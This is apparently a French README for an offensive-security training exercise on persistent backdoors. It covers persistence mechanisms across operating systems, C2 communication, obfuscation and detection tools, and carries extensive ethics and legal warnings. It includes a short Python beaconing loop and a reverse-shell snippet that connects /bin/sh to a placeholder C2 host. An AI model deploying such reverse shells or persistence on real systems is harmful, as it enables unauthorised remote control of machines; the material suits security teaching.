# Exercice 22 - Backdoor Persistant

## Objectifs d'apprentissage
- Comprendre les mécanismes de backdoor et de persistance système
- Implémenter la communication Command & Control (C2)
- Maîtriser les techniques d'auto-démarrage multi-plateformes
- Exécution de commandes à distance
- Techniques d'obfuscation et d'évasion

## Avertissement Éthique Critique

**ATTENTION: CET EXERCICE TRAITE DE TECHNIQUES HAUTEMENT SENSIBLES**

L'implémentation d'un backdoor constitue une activité potentiellement illégale dans de nombreuses juridictions. Ces techniques sont présentées EXCLUSIVEMENT dans un contexte éducatif pour:
- Comprendre les vecteurs d'attaque pour mieux les défendre
- Formation en sécurité offensive dans des environnements contrôlés
- Développement de solutions de détection et de réponse

**INTERDIT:**
- Déployer sur des systèmes sans autorisation explicite écrite
- Utiliser en dehors d'environnements de test isolés
- Distribuer ou partager des backdoors fonctionnels
- Compromettre des systèmes sans cadre légal approprié

**AUTORISÉ UNIQUEMENT:**
- Environnements de laboratoire personnels isolés
- Plateformes CTF et bug bounty avec autorisation
- Tests de pénétration avec contrat et périmètre définis
- Recherche académique dans des environnements contrôlés

Les auteurs et instructeurs déclinent toute responsabilité pour une utilisation malveillante de ces techniques.

## Concepts Clés

### Architecture Backdoor
```
Backdoor Architecture:
├── Persistence → Mécanismes d'auto-démarrage
│   ├── Registry (Windows)
│   ├── Cron/Systemd (Linux)
│   ├── Launch Agents (macOS)
│   └── Scheduled Tasks
├── Communication → Protocole C2
│   ├── HTTP/HTTPS
│   ├── DNS Tunneling
│   ├── Socket Reverse
│   └── Beaconing
├── Execution → Command Runner
│   ├── Shell Commands
│   ├── Code Injection
│   ├── Process Spawning
│   └── Memory Execution
└── Evasion → Techniques Furtives
    ├── Obfuscation
    ├── Anti-Debug
    ├── Timing Randomization
    └── Process Hiding
```

### Mécanismes de Persistance

#### Windows
- Clés Registry (Run, RunOnce, Services)
- Scheduled Tasks (schtasks)
- WMI Event Subscriptions
- DLL Hijacking
- Startup Folder

#### Linux
- Cron jobs
- Systemd services
- Init scripts
- .bashrc/.profile injection
- XDG Autostart

#### macOS
- Launch Agents/Daemons
- Login Items
- Kernel Extensions
- Dylib Hijacking

### Communication C2

#### Protocoles
```python
# HTTP Beaconing
while True:
    command = beacon_to_c2()
    result = execute_command(command)
    exfiltrate_result(result)
    sleep(random_interval())

# Reverse Shell
sock = socket.socket()
sock.connect((C2_HOST, C2_PORT))
subprocess.Popen(["/bin/sh"],
                 stdin=sock,
                 stdout=sock,
                 stderr=sock)
```

### Techniques d'Obfuscation
- Encodage de strings (Base64, XOR, ROT)
- Obfuscation de code (pyarmor, pyobfuscate)
- Packing (UPX, custom packers)
- Polymorphisme et métamorphisme
- Anti-disassembly techniques

## Structure du Projet

```
22_backdoor/
├── README.md
├── main.py
├── exercice.txt
└── solution.txt
```

## Prérequis
- Python 3.8+
- Modules: socket, subprocess, threading, platform, base64
- Compréhension des systèmes d'exploitation
- Connaissance des protocoles réseau
- Environnement de test isolé (VM, conteneur)

## Instructions

1. Lire attentivement l'avertissement éthique
2. Configurer un environnement de test isolé
3. Consulter exercice.txt pour les défis
4. Implémenter les fonctionnalités demandées
5. Tester UNIQUEMENT dans l'environnement isolé
6. Comparer avec solution.txt après tentative
7. DÉTRUIRE les backdoors après apprentissage

## Ressources

### Documentation Officielle
- Python socket: https://docs.python.org/3/library/socket.html
- subprocess: https://docs.python.org/3/library/subprocess.html
- threading: https://docs.python.org/3/library/threading.html

### Références Techniques
- MITRE ATT&CK Framework: Persistence Techniques
- Windows Registry Persistence: Microsoft Docs
- Linux Systemd Services: systemd.io
- macOS Launch Agents: Apple Developer Docs

### Outils de Détection
- Process Monitor (Sysinternals)
- Autoruns (Sysinternals)
- osquery (multi-plateforme)
- YARA rules pour backdoor detection

## Avertissements Légaux

L'utilisation de techniques de backdoor sans autorisation explicite est illégale et peut entraîner:
- Poursuites pénales
- Amendes importantes
- Emprisonnement
- Interdiction professionnelle
- Responsabilité civile

Assurez-vous toujours d'avoir:
- Autorisation écrite signée
- Périmètre de test clairement défini
- Environnement isolé du réseau de production
- Documentation complète des activités
- Accord de confidentialité si applicable

## Support et Questions

Pour toute question sur l'utilisation éthique et légale de ces techniques, consultez:
- Votre département juridique
- Organismes de certification (OSCP, CEH)
- Communautés de sécurité éthique
- Programmes bug bounty reconnus
